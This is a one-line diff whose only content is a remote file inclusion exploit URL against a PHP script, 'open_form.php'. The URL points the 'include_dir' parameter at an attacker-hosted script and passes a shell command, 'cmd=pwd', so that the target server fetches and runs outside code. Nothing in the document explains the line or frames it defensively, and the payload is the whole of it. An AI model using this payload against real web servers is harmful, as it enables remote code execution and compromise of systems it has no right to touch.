@@ -1,0 +1,1 @@
+http://www.example.com/support/include/open_form.php?include_dir=http://ursite/evilscript.txt?cmd=pwd
